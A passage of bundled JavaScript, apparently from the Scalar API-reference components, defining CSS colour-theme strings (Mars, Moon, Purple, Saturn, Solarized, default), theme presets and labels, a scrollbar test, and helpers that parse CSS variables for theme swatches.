#40b4c4;\n  --scalar-color-orange: #ff52bf;\n  --scalar-color-purple: #91889b;\n  --scalar-color-query: #7860a8;\n\n  --scalar-scrollbar-color: rgba(0, 0, 0, 0.18);\n  --scalar-scrollbar-color-active: rgba(0, 0, 0, 0.36);\n}\n.dark-mode {\n  --scalar-button-1: #f6f6f6;\n  --scalar-button-1-color: #27212e;\n  --scalar-button-1-hover: #e7e7e7;\n\n  --scalar-color-green: #74dfc4;\n  --scalar-color-red: #d887f5;\n  --scalar-color-yellow: #ffe261;\n  --scalar-color-blue: #40b4c4;\n  --scalar-color-orange: #ff52bf;\n  --scalar-color-purple: #91889b;\n  --scalar-color-query: #b8a2e3;\n\n  --scalar-scrollbar-color: rgba(255, 255, 255, 0.24);\n  --scalar-scrollbar-color-active: rgba(255, 255, 255, 0.48);\n}\n/* Radius */\n:root {\n  --scalar-radius: 2px;\n  --scalar-radius-lg: 3px;\n  --scalar-radius-xl: 4px;\n}\n/* P3 color support */\n@supports (color: color(display-p3 1 1 1)) {\n  .light-mode {\n    --scalar-color-accent: color(display-p3 0.25098 0.705882 0.768627 / 1);\n    --scalar-color-green: color(display-p3 0.454902 0.87451 0.768627 / 1);\n    --scalar-color-red: color(display-p3 0.847059 0.529412 0.960784 / 1);\n    --scalar-color-yellow: color(display-p3 1 0.886275 0.380392 / 1);\n    --scalar-color-blue: color(display-p3 0.25098 0.705882 0.768627 / 1);\n    --scalar-color-orange: color(display-p3 1 0.321569 0.74902 / 1);\n    --scalar-color-purple: color(display-p3 0.568627 0.533333 0.607843 / 1);\n    --scalar-color-query: color(display-p3 0.470588 0.376471 0.658824 / 1);\n  }\n  .dark-mode {\n    --scalar-color-accent: color(display-p3 0.929412 0.470588 0.760784 / 1);\n    --scalar-color-green: color(display-p3 0.454902 0.87451 0.768627 / 1);\n    --scalar-color-red: color(display-p3 0.847059 0.529412 0.960784 / 1);\n    --scalar-color-yellow: color(display-p3 1 0.886275 0.380392 / 1);\n    --scalar-color-blue: color(display-p3 0.25098 0.705882 0.768627 / 1);\n    --scalar-color-orange: color(display-p3 1 0.321569 0.74902 / 1);\n    --scalar-color-purple: color(display-p3 0.568627 0.533333 0.607843 / 1);\n    --scalar-color-query: color(display-p3 0.721569 0.635294 0.890196 / 1);\n  }\n}\n";
var mars_default = "/* basic theme */\n:root {\n  --scalar-text-decoration: underline;\n  --scalar-text-decoration-hover: underline;\n}\n.light-mode {\n  --scalar-background-1: #f9f6f0;\n  --scalar-background-2: #f2efe8;\n  --scalar-background-3: #e9e7e2;\n  --scalar-border-color: rgba(203, 165, 156, 0.6);\n\n  --scalar-color-1: #c75549;\n  --scalar-color-2: #c75549;\n  --scalar-color-3: #c75549;\n\n  --scalar-color-accent: #c75549;\n  --scalar-background-accent: #dcbfa81f;\n\n  --scalar-code-language-color-supersede: var(--scalar-color-1);\n}\n.dark-mode {\n  --scalar-background-1: #140507;\n  --scalar-background-2: #20090c;\n  --scalar-background-3: #321116;\n  --scalar-border-color: #3c3031;\n\n  --scalar-color-1: rgba(255, 255, 255, 0.9);\n  --scalar-color-2: rgba(255, 255, 255, 0.62);\n  --scalar-color-3: rgba(255, 255, 255, 0.44);\n\n  --scalar-color-accent: rgba(255, 255, 255, 0.9);\n  --scalar-background-accent: #441313;\n\n  --scalar-code-language-color-supersede: var(--scalar-color-1);\n}\n\n/* Document Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-3);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n\n  --scalar-sidebar-search-background: rgba(255, 255, 255, 0.1);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n  z-index: 1;\n}\n/* advanced */\n.light-mode {\n  --scalar-color-green: #09533a;\n  --scalar-color-red: #aa181d;\n  --scalar-color-yellow: #ab8d2b;\n  --scalar-color-blue: #19689a;\n  --scalar-color-orange: #b26c34;\n  --scalar-color-purple: #4c2191;\n  --scalar-color-query: #086566;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: rgba(69, 255, 165, 0.823);\n  --scalar-color-red: #ff8589;\n  --scalar-color-yellow: #ffcc4d;\n  --scalar-color-blue: #6bc1fe;\n  --scalar-color-orange: #f98943;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #79e2da;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n/* Custom Theme */\n.dark-mode h2.t-editor__heading,\n.dark-mode .t-editor__page-title h1,\n.dark-mode h1.section-header:not(::selection),\n.dark-mode .markdown h1,\n.dark-mode .markdown h2,\n.dark-mode .markdown h3,\n.dark-mode .markdown h4,\n.dark-mode .markdown h5,\n.dark-mode .markdown h6 {\n  -webkit-text-fill-color: transparent;\n  background-image: linear-gradient(to right bottom, rgb(255, 255, 255) 30%, rgba(255, 255, 255, 0.38));\n  -webkit-background-clip: text;\n  background-clip: text;\n}\n.light-mode .t-doc__sidebar {\n  --scalar-sidebar-search-background: white;\n}\n.examples .scalar-card-footer {\n  --scalar-background-3: transparent;\n  padding-top: 0;\n}\n/* Hero section flare */\n.section-flare {\n  overflow-x: hidden;\n  height: 100vh;\n  left: initial;\n}\n.section-flare-item:nth-of-type(1) {\n  background: #d25019;\n  position: relative;\n  top: -150px;\n  right: -400px;\n  width: 80vw;\n  height: 500px;\n  margin-top: -150px;\n  border-radius: 50%;\n  filter: blur(100px);\n  z-index: 0;\n}\n.light-mode .section-flare {\n  display: none;\n}\n*::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-red), transparent 75%);\n}\n\n/* document layout */\n.dark-mode .t-doc .layout-content {\n  background: transparent;\n}\n";
var moon_default = ".light-mode {\n  color-scheme: light;\n  --scalar-color-1: #000000;\n  --scalar-color-2: #000000;\n  --scalar-color-3: #000000;\n  --scalar-color-accent: #645b0f;\n  --scalar-background-1: #ccc9b3;\n  --scalar-background-2: #c2bfaa;\n  --scalar-background-3: #b8b5a1;\n  --scalar-background-accent: #000000;\n\n  --scalar-border-color: rgba(0, 0, 0, 0.2);\n  --scalar-scrollbar-color: rgba(0, 0, 0, 0.18);\n  --scalar-scrollbar-color-active: rgba(0, 0, 0, 0.36);\n  --scalar-lifted-brightness: 1;\n  --scalar-backdrop-brightness: 1;\n\n  --scalar-shadow-1: 0 1px 3px 0 rgba(0, 0, 0, 0.11);\n  --scalar-shadow-2:\n    rgba(0, 0, 0, 0.08) 0px 13px 20px 0px, rgba(0, 0, 0, 0.08) 0px 3px 8px 0px, var(--scalar-border-color) 0px 0 0 1px;\n\n  --scalar-button-1: rgb(49 53 56);\n  --scalar-button-1-color: #fff;\n  --scalar-button-1-hover: rgb(28 31 33);\n\n  --scalar-color-red: #b91c1c;\n  --scalar-color-orange: #a16207;\n  --scalar-color-green: #047857;\n  --scalar-color-blue: #1d4ed8;\n  --scalar-color-orange: #c2410c;\n  --scalar-color-purple: #6d28d9;\n  --scalar-color-query: #0f766e;\n}\n\n.dark-mode {\n  color-scheme: dark;\n  --scalar-color-1: #fffef3;\n  --scalar-color-2: #fffef3;\n  --scalar-color-3: #fffef3;\n  --scalar-color-accent: #c3b531;\n  --scalar-background-1: #313332;\n  --scalar-background-2: #393b3a;\n  --scalar-background-3: #414342;\n  --scalar-background-accent: #fffef3;\n\n  --scalar-border-color: #505452;\n  --scalar-scrollbar-color: rgba(255, 255, 255, 0.24);\n  --scalar-scrollbar-color-active: rgba(255, 255, 255, 0.48);\n  --scalar-lifted-brightness: 1.45;\n  --scalar-backdrop-brightness: 0.5;\n\n  --scalar-shadow-1: 0 1px 3px 0 rgba(0, 0, 0, 0.11);\n  --scalar-shadow-2:\n    rgba(15, 15, 15, 0.2) 0px 3px 6px, rgba(15, 15, 15, 0.4) 0px 9px 24px, 0 0 0 1px rgba(255, 255, 255, 0.1);\n\n  --scalar-button-1: #f6f6f6;\n  --scalar-button-1-color: #000;\n  --scalar-button-1-hover: #e7e7e7;\n\n  --scalar-color-green: #00b648;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #ffc90d;\n  --scalar-color-blue: #4eb3ec;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #5eead4;\n}\n\n/* Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: currentColor;\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-3);\n  --scalar-sidebar-color-active: var(--scalar-color-1);\n\n  --scalar-sidebar-search-background: transparent;\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n}\n*::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 80%);\n}\n";
var purple_default = "/* basic theme */\n.light-mode {\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f5f6f8;\n  --scalar-background-3: #eceef1;\n\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n\n  --scalar-color-accent: #5469d4;\n  --scalar-background-accent: #5469d41f;\n\n  --scalar-border-color: rgba(215, 215, 206, 0.68);\n}\n.dark-mode {\n  --scalar-background-1: #15171c;\n  --scalar-background-2: #1c1e24;\n  --scalar-background-3: #22252b;\n\n  --scalar-color-1: #fafafa;\n  --scalar-color-2: #c9ced8;\n  --scalar-color-3: #8c99ad;\n\n  --scalar-color-accent: #5469d4;\n  --scalar-background-accent: #5469d41f;\n\n  --scalar-border-color: #3f4145;\n}\n/* Document Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-3);\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n\n  --scalar-sidebar-search-background: var(--scalar-background-1);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n}\n\n/* advanced */\n.light-mode {\n  --scalar-color-green: #17803d;\n  --scalar-color-red: #e10909;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #1763a6;\n  --scalar-color-orange: #e25b09;\n  --scalar-color-purple: #5c3993;\n  --scalar-color-query: #147873;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: #30a159;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #eec644;\n  --scalar-color-blue: #2b7abf;\n  --scalar-color-orange: #f07528;\n  --scalar-color-purple: #7a59b1;\n  --scalar-color-query: #4ac6b7;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n.light-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 70%);\n}\n.dark-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 50%);\n}\n";
var saturn_default = "/* basic theme */\n.light-mode {\n  --scalar-background-1: #f3f3ee;\n  --scalar-background-2: #e8e8e3;\n  --scalar-background-3: #e4e4df;\n  --scalar-border-color: rgba(215, 215, 206, 0.85);\n\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n\n  --scalar-color-accent: #1763a6;\n  --scalar-background-accent: #1f648e1f;\n}\n.dark-mode {\n  --scalar-background-1: #09090b;\n  --scalar-background-2: #18181b;\n  --scalar-background-3: #2c2c30;\n  --scalar-border-color: rgba(255, 255, 255, 0.17);\n\n  --scalar-color-1: #fafafa;\n  --scalar-color-2: rgb(161, 161, 170);\n  --scalar-color-3: rgba(255, 255, 255, 0.533);\n\n  --scalar-color-accent: #4eb3ec;\n  --scalar-background-accent: #8ab4f81f;\n}\n/* Document Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: currentColor;\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-3);\n  --scalar-sidebar-color-active: var(--scalar-color-1);\n\n  --scalar-sidebar-search-background: var(--scalar-background-1);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n}\n\n/* advanced */\n.light-mode {\n  --scalar-color-green: #17803d;\n  --scalar-color-red: #e10909;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #1763a6;\n  --scalar-color-orange: #e25b09;\n  --scalar-color-purple: #5c3993;\n  --scalar-color-query: #147873;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: #30a159;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #eec644;\n  --scalar-color-blue: #2b7abf;\n  --scalar-color-orange: #f07528;\n  --scalar-color-purple: #7a59b1;\n  --scalar-color-query: #4ac6b7;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n.dark-mode h2.t-editor__heading,\n.dark-mode .t-editor__page-title h1,\n.dark-mode h1.section-header:not(::selection),\n.dark-mode .markdown h1,\n.dark-mode .markdown h2,\n.dark-mode .markdown h3,\n.dark-mode .markdown h4,\n.dark-mode .markdown h5,\n.dark-mode .markdown h6 {\n  -webkit-text-fill-color: transparent;\n  background-image: linear-gradient(to right bottom, rgb(255, 255, 255) 30%, rgba(255, 255, 255, 0.38));\n  -webkit-background-clip: text;\n  background-clip: text;\n}\n.light-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 70%);\n}\n.dark-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 50%);\n}\n";
var solarized_default = ".light-mode {\n  color-scheme: light;\n  --scalar-color-1: #584c27;\n  --scalar-color-2: #616161;\n  --scalar-color-3: #a89f84;\n  --scalar-color-accent: #b58900;\n  --scalar-background-1: #fdf6e3;\n  --scalar-background-2: #eee8d5;\n  --scalar-background-3: #ddd6c1;\n  --scalar-background-accent: #b589001f;\n\n  --scalar-border-color: #ded8c8;\n  --scalar-scrollbar-color: rgba(0, 0, 0, 0.18);\n  --scalar-scrollbar-color-active: rgba(0, 0, 0, 0.36);\n  --scalar-lifted-brightness: 1;\n  --scalar-backdrop-brightness: 1;\n\n  --scalar-shadow-1: 0 1px 3px 0 rgba(0, 0, 0, 0.11);\n  --scalar-shadow-2: rgba(0, 0, 0, 0.08) 0px 13px 20px 0px, rgba(0, 0, 0, 0.08) 0px 3px 8px 0px, #eeeeed 0px 0 0 1px;\n\n  --scalar-button-1: rgb(49 53 56);\n  --scalar-button-1-color: #fff;\n  --scalar-button-1-hover: rgb(28 31 33);\n\n  --scalar-color-red: #b91c1c;\n  --scalar-color-orange: #a16207;\n  --scalar-color-green: #047857;\n  --scalar-color-blue: #1d4ed8;\n  --scalar-color-orange: #c2410c;\n  --scalar-color-purple: #6d28d9;\n  --scalar-color-query: #007f78;\n}\n\n.dark-mode {\n  color-scheme: dark;\n  --scalar-color-1: #fff;\n  --scalar-color-2: #cccccc;\n  --scalar-color-3: #6d8890;\n  --scalar-color-accent: #007acc;\n  --scalar-background-1: #00212b;\n  --scalar-background-2: #012b36;\n  --scalar-background-3: #004052;\n  --scalar-background-accent: #015a6f;\n\n  --scalar-border-color: #2f4851;\n  --scalar-scrollbar-color: rgba(255, 255, 255, 0.24);\n  --scalar-scrollbar-color-active: rgba(255, 255, 255, 0.48);\n  --scalar-lifted-brightness: 1.45;\n  --scalar-backdrop-brightness: 0.5;\n\n  --scalar-shadow-1: 0 1px 3px 0 rgb(0, 0, 0, 0.1);\n  --scalar-shadow-2:\n    rgba(15, 15, 15, 0.2) 0px 3px 6px, rgba(15, 15, 15, 0.4) 0px 9px 24px, 0 0 0 1px rgba(255, 255, 255, 0.1);\n\n  --scalar-button-1: #f6f6f6;\n  --scalar-button-1-color: #000;\n  --scalar-button-1-hover: #e7e7e7;\n\n  --scalar-color-green: #00b648;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #ffc90d;\n  --scalar-color-blue: #4eb3ec;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #7bdac7;\n}\n\n/* Sidebar */\n.light-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n  --scalar-sidebar-search-background: var(--scalar-background-2);\n  --scalar-sidebar-search-border-color: var(--scalar-sidebar-search-background);\n  --scalar-sidebar-search--color: var(--scalar-color-3);\n}\n\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-color-active: var(--scalar-sidebar-color-1);\n  --scalar-sidebar-search-background: var(--scalar-background-2);\n  --scalar-sidebar-search-border-color: var(--scalar-sidebar-search-background);\n  --scalar-sidebar-search--color: var(--scalar-color-3);\n}\n*::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 70%);\n}\n";
/**
* Scrollbar Width Test
*
* Return true if scrollbars use up screen real estate.
*
* @see https://www.filamentgroup.com/lab/scrollbars/
*/
function hasObtrusiveScrollbars() {
	if (typeof window === "undefined") return false;
	const parent = document.createElement("div");
	parent.setAttribute("style", "width:30px;height:30px;overflow-y:scroll;");
	parent.classList.add("scrollbar-test");
	const child = document.createElement("div");
	child.setAttribute("style", "width:100%;height:40px");
	parent.appendChild(child);
	document.body.appendChild(parent);
	const scrollbarWidth = 30 - parent.firstChild.clientWidth;
	document.body.removeChild(parent);
	return !!scrollbarWidth;
}
var themeIds = [
	"alternate",
	"default",
	"moon",
	"purple",
	"solarized",
	"bluePlanet",
	"deepSpace",
	"saturn",
	"kepler",
	"elysiajs",
	"fastify",
	"mars",
	"laserwave",
	"none"
];
/**
* User readable theme names / labels
*/
var themeLabels = {
	default: "Default",
	alternate: "Alternate",
	moon: "Moon",
	purple: "Purple",
	solarized: "Solarized",
	elysiajs: "Elysia.js",
	fastify: "Fastify",
	bluePlanet: "Blue Planet",
	saturn: "Saturn",
	kepler: "Kepler-11e",
	mars: "Mars",
	deepSpace: "Deep Space",
	laserwave: "Laserwave",
	none: "None"
};
/**
* Formatted list of available theme presets.
*
* Used across the Scalar platform as base themes. Extendable by team defined themes
*
* Static UIDs must be assigned and never changed when a new theme is created.
* Slugs should be formatted as kebab-case and cannot change after initial creation.
*/
var presets = {
	default: {
		uid: "qTQR9jSM8E-LihpyZzPOi",
		name: "Default",
		description: "Default Scalar theme",
		theme: default_default,
		slug: "default"
	},
	alternate: {
		uid: "2skUDSH4S8HYFF9yXysr-",
		name: "Alternate",
		description: "Alternate Scalar theme",
		theme: alternate_default,
		slug: "alternate"
	},
	moon: {
		uid: "DG9ZUNp5lJhDeX_kPX4Bl",
		name: "Moon",
		description: "Lunar styles",
		theme: moon_default,
		slug: "moon"
	},
	purple: {
		uid: "pE_1ysxcZ-y2LM1GGNBUv",
		name: "Purple",
		description: "Purple Scalar theme",
		theme: purple_default,
		slug: "purple"
	},
	solarized: {
		uid: "BdGVG1vf-4nYl3wJKyj8l",
		name: "Solarized",
		description: "Solarized Scalar theme",
		theme: solarized_default,
		slug: "solarized"
	},
	bluePlanet: {
		uid: "X12IfAvl7ue-42V2lW40S",
		name: "Blue Planet",
		description: "Blue Planet Scalar theme",
		theme: bluePlanet_default,
		slug: "blue-planet"
	},
	deepSpace: {
		uid: "K8b38NWQiicq4-zXGXKdI",
		name: "Deep Space",
		description: "Deep Space Scalar theme",
		theme: deepSpace_default,
		slug: "deep-space"
	},
	saturn: {
		uid: "1jyAjmbIZQG-RUU4Ugk9o",
		name: "Saturn",
		description: "Saturn Scalar theme",
		theme: saturn_default,
		slug: "saturn"
	},
	kepler: {
		uid: "jZ6dnWbtqQ0Hz3s9jLPH0",
		name: "Kepler-11e",
		description: "Kepler-11e Scalar theme",
		theme: kepler_default,
		slug: "kepler-11e"
	},
	mars: {
		uid: "YY4LQgwiXix55-TmMz9qd",
		name: "Mars",
		description: "Mars Scalar theme",
		theme: mars_default,
		slug: "mars"
	},
	laserwave: {
		uid: "c5fZEi-K-hP-xXf885dkf",
		name: "Laserwave",
		description: "Laserwave Scalar theme",
		theme: laserwave_default,
		slug: "laserwave"
	},
	elysiajs: {
		uid: "nEVZkRmCylPkT0o9YJa7y",
		name: "Elysia.js",
		description: "Elysia.js theme",
		theme: elysiajs_default,
		slug: "elysiajs"
	},
	fastify: {
		uid: "nTZcdcM2_yHFZFxTQe9Kk",
		name: "Fastify",
		description: "Fastify theme",
		theme: fastify_default,
		slug: "fastify"
	}
};
Object.values(presets);
/** Get the theme and base variables for a given theme */
var getThemeStyles = (themeId, opts) => {
	const { fonts = true, layer = "scalar-theme" } = opts ?? {};
	const styles = [presets[themeId || "default"]?.theme ?? "/* basic theme */\n:root {\n  --scalar-text-decoration: underline;\n  --scalar-text-decoration-hover: underline;\n}\n.light-mode {\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f6f6f6;\n  --scalar-background-3: #e7e7e7;\n  --scalar-background-accent: #8ab4f81f;\n\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n\n  --scalar-color-accent: #0099ff;\n  --scalar-border-color: #dfdfdf;\n}\n.dark-mode {\n  --scalar-background-1: #0f0f0f;\n  --scalar-background-2: #1a1a1a;\n  --scalar-background-3: #272727;\n\n  --scalar-color-1: #e7e7e7;\n  --scalar-color-2: #a4a4a4;\n  --scalar-color-3: #797979;\n\n  --scalar-color-accent: #00aeff;\n  --scalar-background-accent: #3ea6ff1f;\n\n  --scalar-border-color: #2d2d2d;\n}\n/* Document Sidebar */\n.light-mode,\n.dark-mode {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: var(--scalar-sidebar-color-2);\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-2);\n  --scalar-sidebar-color-active: var(--scalar-sidebar-color-1);\n\n  --scalar-sidebar-indent-border: var(--scalar-sidebar-border-color);\n  --scalar-sidebar-indent-border-hover: var(--scalar-sidebar-border-color);\n  --scalar-sidebar-indent-border-active: var(--scalar-sidebar-border-color);\n\n  --scalar-sidebar-search-background: color-mix(in srgb, var(--scalar-background-2), var(--scalar-background-1));\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n}\n/* advanced */\n.light-mode {\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #ff5800;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-link-color: var(--scalar-color-1);\n  --scalar-link-color-hover: var(--scalar-link-color);\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n\n  --scalar-tooltip-background: color-mix(in srgb, var(--scalar-background-1), transparent 10%);\n  --scalar-tooltip-color: var(--scalar-color-1);\n\n  --scalar-color-alert: color-mix(in srgb, var(--scalar-color-orange), var(--scalar-color-1) 20%);\n  --scalar-color-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-color-1) 20%);\n\n  --scalar-background-alert: color-mix(in srgb, var(--scalar-color-orange), var(--scalar-background-1) 95%);\n  --scalar-background-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-background-1) 95%);\n}\n.dark-mode {\n  --scalar-color-green: #00b648;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #ffc90d;\n  --scalar-color-blue: #4eb3ec;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #65d4cf;\n\n  --scalar-link-color: var(--scalar-color-1);\n  --scalar-link-color-hover: var(--scalar-link-color);\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n\n  --scalar-tooltip-background: color-mix(in srgb, var(--scalar-background-1), #fff 10%);\n  --scalar-tooltip-color: color-mix(in srgb, #fff, transparent 5%);\n\n  --scalar-color-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-background-1) 20%);\n\n  --scalar-background-alert: color-mix(in srgb, var(--scalar-color-orange), var(--scalar-background-1) 95%);\n  --scalar-background-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-background-1) 95%);\n}\n@supports (color: color(display-p3 1 1 1)) {\n  .light-mode {\n    --scalar-color-accent: color(display-p3 0 0.6 1 / 1);\n    --scalar-color-green: color(display-p3 0.023529 0.564706 0.380392 / 1);\n    --scalar-color-red: color(display-p3 0.937255 0 0.023529 / 1);\n    --scalar-color-yellow: color(display-p3 0.929412 0.745098 0.12549 / 1);\n    --scalar-color-blue: color(display-p3 0 0.509804 0.815686 / 1);\n    --scalar-color-orange: color(display-p3 1 0.4 0.02);\n    --scalar-color-purple: color(display-p3 0.321569 0.011765 0.819608 / 1);\n  }\n  .dark-mode {\n    --scalar-color-accent: color(display-p3 0.07 0.67 1);\n    --scalar-color-green: color(display-p3 0 0.713725 0.282353 / 1);\n    --scalar-color-red: color(display-p3 0.862745 0.105882 0.098039 / 1);\n    --scalar-color-yellow: color(display-p3 1 0.788235 0.05098 / 1);\n    --scalar-color-blue: color(display-p3 0.305882 0.701961 0.92549 / 1);\n    --scalar-color-orange: color(display-p3 1 0.552941 0.301961 / 1);\n    --scalar-color-purple: color(display-p3 0.694118 0.568627 0.976471 / 1);\n  }\n}\n", fonts ? fonts_default : ""].join("");
	if (layer) return `@layer ${layer} {\n${styles}}`;
	return styles;
};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarThemeSwatches/useThemeSwatches.js
/** Theme CSS variables */
var THEME_CSS_VARS = [
	"--scalar-color-1",
	"--scalar-color-2",
	"--scalar-color-3",
	"--scalar-background-1",
	"--scalar-background-2",
	"--scalar-background-3",
	"--scalar-color-accent"
];
/**
* Parses a given css string for a css variable regexp
*/
function getVars(cssVarPattern, css) {
	const matches = [...css.matchAll(new RegExp(`(${cssVarPattern}): ([^;]+);`, "gm"))];
	if (matches.length === 0) return {};
	return Object.fromEntries(matches.map((match) => [match[1], match[2]]));
}
/**
* Parses a given css string for the variables we want
*/
function parseRules(css) {
	if (!css) return {};
	return {
		...getVars("--scalar-color-[1-3]", css),
		...getVars("--scalar-background-[1-3]", css),
		...getVars("--scalar-color-accent", css)
	};
}
/**
* Returns the light and dark colors for a given css string
*/
function useThemeSwatches(css) {
	return { colors: computed(() => ({
		light: parseRules(toValue(css).match(/\.light-mode[^{]*{[^}]*}/m)?.[0]),
		dark: parseRules(toValue(css).match(/\.dark-mode[^{]*{[^}]*}/m)?.[0])
	})) };
}
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarThemeSwatches/ScalarThemeSwatches.vue.js
var ScalarThemeSwatches_default = /* @__PURE__ */ defineComponent({
